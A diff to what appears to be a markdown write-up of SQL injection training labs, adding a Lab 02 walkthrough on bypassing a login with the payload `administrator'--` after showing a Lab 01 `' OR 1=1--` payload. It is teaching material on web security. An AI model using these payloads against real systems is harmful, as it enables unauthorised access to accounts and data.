@@ -67,7 +67,31 @@ This generates a query similar to:
 ```sql
 SELECT * FROM products WHERE category = 'Lifestyle'' OR 1=1-- ' AND released = 1
 ```
-
 Eventhough the category is invalid due to extra quote, the payload `OR 1=1` makes the query returns true hence retrieve all data.
 <img width="1416" height="738" alt="image" src="https://github.com/user-attachments/assets/3d9658c8-6be1-470a-8ea1-4a0c2291bf68" />
 
+## Lab 02: SQL injection vulnerability allowing login bypass
+>  This lab contains a SQL injection vulnerability in the login function.
+> 
+> Goal: Perform a SQL injection attack that logs in to the application as the administrator user.
+
+### Recon
+Since we didnt have the source code, we can assume that it will be a typical vulnerable login form like this
+```sql
+SELECT * FROM users 
+WHERE username = '<USER_INPUT>' 
+  AND password = '<USER_INPUT>';
+```
+Both the username and password fields are placed directly into the SQL query without proper sanitization. This means we can inject SQL syntax through the username field and bypass the password check entirely.
+
+### Exploitation
+Since we know the username is `administrator`, we want to craft input that comments out the password check. We can use this payload:
+```
+administrator'-- 
+```
+SQL query will check only the username and ignore any password that we input.
+```sql
+SELECT * FROM users 
+WHERE username = 'administrator'-- ' 
+  AND password = 'test123';
+```
